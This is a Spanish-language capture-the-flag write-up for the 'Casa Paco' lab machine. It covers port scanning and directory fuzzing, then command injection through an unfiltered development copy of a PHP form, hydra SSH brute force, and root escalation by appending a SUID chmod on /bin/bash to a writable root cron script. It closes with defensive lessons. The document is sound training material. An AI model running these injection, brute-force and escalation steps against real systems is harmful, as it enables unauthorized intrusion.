# Casa Paco

<img width="1341" height="623" alt="image" src="https://github.com/user-attachments/assets/d1af244b-226d-4d62-8fca-43328fc3b82c" />

**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 29/07/2026

## 0. Resumen

Máquina Linux de nivel principiante que simula la web de un restaurante de comida para llevar

El camino de explotación combina:
- Descubrimiento de un endpoint "gemelo" sin las mismas protecciones que el original
- Inyección de comandos para enumerar usuarios del sistema
- Fuerza bruta SSH para el acceso inicial
- Escalada a root abusando de un script de cron editable

## 1. Reconocimiento

Ping

```bash
ping -c 2 <IP>
```

<img width="1106" height="126" alt="image" src="https://github.com/user-attachments/assets/eb077578-ca54-45eb-943b-caa6cb74fa3a" />

→ TTL=64 sugiere que se trata de un host Linux

Nmap

```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA casapaco
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |

**Resultados:**

- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 80: Apache 2.4.62, redirige a `casapaco.thl`

### 2. Configuración de DNS local

```bash
echo "<IP> casapaco.thl" | sudo tee -a /etc/hosts
```

## 3. Enumeración WEB

<img width="1260" height="728" alt="image" src="https://github.com/user-attachments/assets/37bfff2f-f9a9-4c98-a33c-a1321e8780c3" />

## 3.1 Fuzzing de directorios y archivos

```bash
gobuster dir -u http://casapaco.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

<img width="949" height="187" alt="image" src="https://github.com/user-attachments/assets/0346bf08-eb47-4139-868d-85e59d06faca" />

Directorios de interés: `static` contiene recursos estáticos, como las imágenes de la web

```bash
feroxbuster -u http://casapaco.thl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```

<img width="1290" height="227" alt="image" src="https://github.com/user-attachments/assets/985536f3-9ef7-42b0-b8fb-94e6c62ac608" />

Archivos de interés: `llevar.php` correspondiente a un formulario de comida a domicilio

<img width="1161" height="455" alt="image" src="https://github.com/user-attachments/assets/8b67e058-2936-4377-b164-98fe8d90aa07" />

## 4. Explotación 

## 4.1 Inyección de comandos en llevar.php

En primer lugar, probamos la funcionalidad del formulario introduciendo en los campos de nombre y comida: `Mvind0 : Cocido`

<img width="1071" height="653" alt="image" src="https://github.com/user-attachments/assets/d1dd08b9-2d59-4a83-af0f-7e58ca2b4a4a" />

Nos lanza un mensaje de aviso que nos indica de la posible salida de comandos, por lo que intentamos averiguar de qué usuario se trata y qué otros archivos contiene el directorio

<img width="964" height="674" alt="image" src="https://github.com/user-attachments/assets/8454d3ac-deb3-4066-9d14-a97cffa051f7" />

→ Usuario: www-data

<img width="1010" height="677" alt="image" src="https://github.com/user-attachments/assets/aba2e377-8f83-431c-9d81-6b301d07801e" />

→ Archivos de interés: `llevar1.php`

Al intentar realizar una consulta mediante `cat /etc/passwd` para enumerar usuarios en el sistema, obtenemos el siguiente error: `Pide comida no intentes hackearme. Los callos estan muy ricos.`

Analizando este mensaje con BurpSuite, nos damos cuenta de que el archivo `llevar.php` contiene un filtro que bloquea cierta peticiones

<img width="1558" height="671" alt="image" src="https://github.com/user-attachments/assets/91a6d847-4e79-4b8c-9cfb-4ef38abe1159" />

→ El filtro bloquea comandos simples: `'/\b(whoami|ls|pwd|cat|sh|bash)\b/i'`

Navegamos entonces hacia `http://casapaco.thl/llevar1.php` para ver qué contiene

<img width="991" height="460" alt="image" src="https://github.com/user-attachments/assets/bf425535-68b5-462a-a47a-9460978d6a71" />

Nos redirige a una copia del formulario original que parece corresponder a una versión en desarrollo o de pruebas dejada en producción

## 4.2 Inyección de comandos en llevar1.php

Al intentar realizar una consulta mediante el formulario web mediante `cat /etc/passwd` para enumerar usuarios, la página nos devuelve el siguiente error: `Pide comida no intentes hackearme. Los callos estan muy ricos.`

Sin embargo, si comprobamos las propiedades de `llevar1.php` comprobamos que no tiene filtros de bloqueo, como en el caso anterior

<img width="1558" height="679" alt="image" src="https://github.com/user-attachments/assets/db2a8d29-8322-41b8-8239-458172c88813" />

En consecuencia, intentaremos realizar la petición mediante BurpSuite modificando el header a `POST /llevar1.php HTTP/1.1` en lugar de `POST /llevar.php HTTP/1.1`

<img width="1558" height="669" alt="image" src="https://github.com/user-attachments/assets/0a0f5643-8079-4460-b36d-14456c72b439" />

→ Revela usuario `pacogerente` (UID 1001) con shell /bin/bash y login interactivo

## 5. Acceso Inicial — Fuerza Bruta SSH

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

| Orden | Función |
|---|---|
| `-l` | Nombre de usuario |
| `-P` | Diccionario con contraseñas comunes |
| `-ssh` | Número de tareas simultáneas |

<img width="1296" height="230" alt="image" src="https://github.com/user-attachments/assets/d09f91b8-7b20-4ee3-a45a-008245fcfcc3" />

→ Credenciales válidas: `pacogerente : dipset1`

## 6. Escalada de privilegios - Cron editable

### 6.1 Enumeración

```bash
sudo -l: no permitido
su:      requiere contraseña de root
```

Subimos el archivo `pspy64` a la máquina víctima, previamente descargado de GitHub en nuestra máquina atacante (https://github.com/dominicbreuker/pspy), para monitorizar procesos en segundo plano sin necesidad de privilegios

```bash
scp pspy64 pacogerente@casapaco.thl:/tmp/

./pspy64
```

<img width="1126" height="120" alt="image" src="https://github.com/user-attachments/assets/a641ec34-6842-4e8a-99d8-331b5d39b30e" />

→ Se detecta que `fabada.sh` se ejecuta periódicamente con permisos de root (tarea de cron)

### 6.2 Comprobación de permisos

```bash
ls -la /ruta/a/fabada.sh
```

→ El usuario `pacogerente` tiene permiso de escritura sobre el script

A continuación, inspeccionamos el contenido del script, que inicialmente solo parece contener un log de actividad con fecha y hora

<img width="1235" height="88" alt="image" src="https://github.com/user-attachments/assets/e3dbedca-ab8c-49ce-85c2-23d83c339885" />

## 6.3  Edición del script

```bash
echo 'chmod u+s /bin/bash' >> /home/pacogerente/fabada.sh
```

→ En la siguiente ejecución programada del cron, el script corre como root y aplica el bit SUID sobre /bin/bash

## 7. Escalada a root

```bash
bash -p
```

<img width="1065" height="54" alt="image" src="https://github.com/user-attachments/assets/83f15d4e-e6c0-4723-aab9-bfb57026e337" />

→ Shell con privilegios de root

## 7.1 Primera flag (pacogerente)

```bash
cat /home/pacogerente/user.txt
```

## 7.2 Segunda flag (root)

```bash
cat /root/root.txt
```

## 8. Lecciones aprendidas

<img width="1255" height="540" alt="image" src="https://github.com/user-attachments/assets/44679d69-d3d7-47c3-9c68-4b80e7f03742" />

- Los endpoints de desarrollo (`llevar1.php`) pueden quedar sin las mismas protecciones que el endpoint oficial, por lo que hay que auditar todas las copias/variantes de un mismo archivo
  
- Las contraseñas débiles en servicios SSH expuestos son vulnerables a fuerza bruta. Conviene forzar políticas de contraseñas robustas

- Las tareas de cron que se ejecutan como root deben revisarse junto con los permisos de los scripts que invocan (`crontab -l`, `/etc/cron.d/`), ya que un script editable por un usuario sin privilegios es una escalada directa














